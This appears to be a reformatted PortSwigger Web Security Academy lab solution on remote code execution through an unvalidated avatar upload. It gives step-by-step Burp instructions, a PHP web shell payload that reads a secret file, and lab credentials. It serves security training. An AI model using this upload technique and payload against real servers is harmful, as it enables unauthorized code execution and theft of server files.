## Remote code execution via web shell upload

**Category:** file_upload
**Difficulty:** Unknown

### Description
This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

### Solution Steps
1. While proxying traffic through Burp, log in to your account and notice the option for uploading an avatar image.
2. Upload an arbitrary image, then return to your account page. Notice that a preview of your avatar is now displayed on the page.
3. In Burp, go to Proxy > HTTP history . Click the filter bar to open the HTTP history filter window. Under Filter by MIME type , enable the Images checkbox, then apply your changes.
4. In the proxy history, notice that your image was fetched using a GET request to /files/avatars/<YOUR-IMAGE> . Send this request to Burp Repeater.
5. On your system, create a file called exploit.php , containing a script for fetching the contents of Carlos's secret file. For example: <?php echo file_get_contents('/home/carlos/secret'); ?>
6. Use the avatar upload function to upload your malicious PHP file. The message in the response confirms that this was uploaded successfully.
7. In Burp Repeater, change the path of the request to point to your PHP file: GET /files/avatars/exploit.php HTTP/1.1
8. Send the request. Notice that the server has executed your script and returned its output (Carlos's secret) in the response.
9. Submit the secret to solve the lab.

### Key Payloads
- `/home/carlos/secret`
- `wiener:peter`
- `/files/avatars/<YOUR-IMAGE>`
- `exploit.php`
- `<?php echo file_get_contents('/home/carlos/secret'); ?>`
- `GET /files/avatars/exploit.php HTTP/1.1`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: file_upload

---
*Source: PortSwigger Web Security Academy*
